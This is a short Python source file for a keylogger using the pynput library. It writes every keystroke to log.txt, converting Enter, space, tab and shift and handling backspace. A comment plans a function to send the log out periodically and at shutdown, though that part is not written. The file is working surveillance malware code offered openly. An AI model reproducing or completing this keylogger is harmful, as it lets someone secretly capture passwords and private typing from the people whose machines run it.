from  pynput import keyboard


#create a file for logging 
with open("log.txt",'w')as log:
	pass


#use pynput for keyboard function
def on_press(key):
	try:
		with open("log.txt",'a')as log:
			#check for keyboard actions we dont want in the log and write to the file
			if key == keyboard.Key.enter:
				new = '\n'
				key = new
				log.write(str(key))
				pass
			elif key == keyboard.Key.ctrl:
				pass

			elif key == keyboard.Key.space:
				space = " "
				key = space
				log.write(str(key))

			elif key == keyboard.Key.backspace:
				log.seek(log.tell() -1,0)
				log.truncate()
			elif key == keyboard.Key.shift:
				space = " "
				key = space
				log.write(str(key))

			elif key == keyboard.Key.tab:
				space = " "
				key = space
				log.write(str(key))


			else:
				log.write(str(key).replace("'",""))



	#make a function that will send the file updating it every n minutes and if the computer is shutting down or restarting  aswell
	

	except AttributeError:
		pass

			





with keyboard.Listener(on_press=on_press) as listener:
   	listener.join()

